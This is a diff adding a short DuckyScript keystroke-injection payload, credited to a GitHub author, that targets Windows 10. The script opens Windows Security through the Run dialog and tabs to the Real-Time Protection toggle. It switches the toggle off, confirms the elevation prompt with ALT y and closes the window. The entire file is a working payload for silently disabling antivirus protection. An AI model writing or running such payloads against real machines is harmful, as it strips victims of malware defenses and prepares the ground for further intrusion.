@@ -1,0 +1,30 @@
+REM Title: Disable Real-Time Protection
+REM Author: @beigeworm | https://github.com/beigeworm
+REM Description: Manually opens Windows Security window and turns offf Real-Time Protection.
+REM Target: Windows 10
+
+
+REM some setup for dukie script.
+DEFAULT_DELAY 100
+
+REM open Windows Security GUI.
+GUI r
+DELAY 1500
+STRING windowsdefender://
+ENTER
+DELAY 2000
+
+REM run through option list and turn RT-protection off.
+ENTER
+TAB
+TAB
+TAB
+TAB
+ENTER
+DELAY 200
+SPACE
+DELAY 300
+ALT y
+DELAY 400
+ALT F4
+
